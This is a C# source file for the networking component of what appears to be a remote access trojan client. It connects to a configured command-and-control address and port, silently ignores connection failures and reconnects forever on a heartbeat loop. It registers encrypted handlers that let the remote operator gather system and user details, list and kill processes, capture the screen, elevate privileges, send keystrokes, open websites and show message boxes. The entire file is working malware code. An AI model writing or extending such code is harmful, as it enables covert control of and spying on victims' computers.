using Client.Config;
using Client.Core.Events;
using Client.Core.Security;
using NetworkCommsDotNet;
using NetworkCommsDotNet.Connections;
using NetworkCommsDotNet.Connections.TCP;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client.Core.Networking
{
    class NetworkManager
    {
        public static Connection Connection;
        public static bool IsConnected
        {
            get
            {
                if (Connection == null)
                    return false;
                else if (!RespondedToHeartbeat)
                    return false;
                else return true;
            }
        }

        private static bool RespondedToHeartbeat;
        
        public static void Connect()
        {
            try
            {
                Connection = TCPConnection.GetConnection(new NetworkCommsDotNet.ConnectionInfo(Settings.CNC_ADDRESS, Settings.CNC_PORT));
                RespondedToHeartbeat = true;
                SetupHandlers();
            }
            catch
            {

            }
        }   

        public static void Disconnect()
        {
            if(Connection != null && Connection.ConnectionAlive())
            {
                Connection.CloseConnection(false);
                Connection = null;
            }
            else
            {
                Connection = null;
            }
        }


        public static void SetupHandlers()
        {
            Connection.AppendIncomingPacketHandler<string>("GetOperatingSystemReq", (packetHeader, connection, incomingData) =>
            {
                GetOperatingSystem.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("GetAccountTypeReq", (packetHeader, connection, incomingData) =>
            {
                GetAccountType.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("GetUserNameReq", (packetHeader, connection, incomingData) =>
            {
                GetUserName.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("GetProcessReq", (packetHeader, connection, incomingData) =>
            {
                GetProcess.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("KillProcessReq", (packetHeader, connection, incomingData) =>
            {
                KillProcess.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("SubmitScreenReq", (packetHeader, connection, incomingData) =>
            {
                SubmitScreen.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("CloseReq", (packetHeader, connection, incomingData) =>
            {
                Close.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("ElevateReq", (packetHeader, connection, incomingData) =>
            {
                Elevate.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("SendKeyReq", (packetHeader, connection, incomingData) =>
            {
                PressKey.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("OpenWebsiteReq", (packetHeader, connection, incomingData) =>
            {
                OpenWebsite.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("ShowMessageBoxReq", (packetHeader, connection, incomingData) =>
            {
                ShowMessageBox.Execute(Cryptography.Decrypt(incomingData));
            });

        }

        public static void StartReconnect()
        {
            ConnectionChecker();
        }

        private static void ConnectionChecker()
        {
            Thread t = new Thread(CheckConnection);
            t.Start();
        }

        private static void CheckConnection()
        {
            while(true)
            {
                string guid = Guid.NewGuid().ToString();
                try
                {
                    RespondedToHeartbeat = Cryptography.Decrypt(Connection.SendReceiveObject<string, string>("HeartbeatReq", "HeartbeatRep", 2000, Cryptography.Encrypt(guid))) == guid;
                }
                catch
                {
                    RespondedToHeartbeat = false;
                }

                if (!IsConnected)
                {
                    Connect();
                }
                Thread.Sleep(Settings.CNC_RECONNECT_TIME);
            }
        }
    }
}
